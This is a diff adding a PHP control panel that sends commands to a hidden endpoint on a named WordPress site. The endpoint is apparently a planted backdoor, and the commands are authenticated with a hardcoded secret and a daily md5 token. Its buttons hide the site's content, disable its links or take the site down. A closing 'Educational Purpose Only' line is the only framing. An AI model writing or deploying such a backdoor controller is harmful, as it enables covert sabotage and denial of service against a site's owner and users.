@@ -1,0 +1,67 @@
+<?php
+// Remote Control Panel for WordPress Site
+session_start();
+
+// Target site (apni website ka URL daalo)
+$site_url = 'https://sportfarmas.com/';
+$secret_key = 'mysecretkey123';
+
+// Function to send command via HTTP
+function sendCommand($site, $command, $key) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $site . '/?sys_opt_admin=1');
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+        'sys_cmd' => $command,
+        'auth' => md5($key . date('Ymd'))
+    ]));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_COOKIE, 'wordpress_test_cookie=WP+Cookie+check');
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response;
+}
+
+// Handle button clicks
+if (isset($_POST['action'])) {
+    sendCommand($site_url, $_POST['action'], $secret_key);
+    $message = "Command sent: " . $_POST['action'];
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Site Control Panel</title>
+    <style>
+        body { font-family: Arial; margin: 50px; background: #f0f0f0; }
+        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        button { padding: 15px 30px; margin: 10px; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; }
+        .btn-hide { background: #ffc107; color: black; }
+        .btn-links { background: #17a2b8; color: white; }
+        .btn-down { background: #dc3545; color: white; }
+        .btn-reset { background: #28a745; color: white; }
+        .message { margin-top: 20px; padding: 10px; border-radius: 5px; background: #d4edda; color: #155724; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Site Control Panel</h1>
+        <p>Target: <?php echo $site_url; ?></p>
+        
+        <?php if (isset($message)): ?>
+            <div class="message"><?php echo $message; ?></div>
+        <?php endif; ?>
+        
+        <form method="post">
+            <button type="submit" name="action" value="hide_content" class="btn-hide">Hide Content</button>
+            <button type="submit" name="action" value="disable_links" class="btn-links">Disable Links</button>
+            <button type="submit" name="action" value="site_down" class="btn-down">Site Down</button>
+            <button type="submit" name="action" value="none" class="btn-reset">Reset</button>
+        </form>
+        
+        <p><small>Educational Purpose Only.</small></p>
+    </div>
+</body>
+</html>
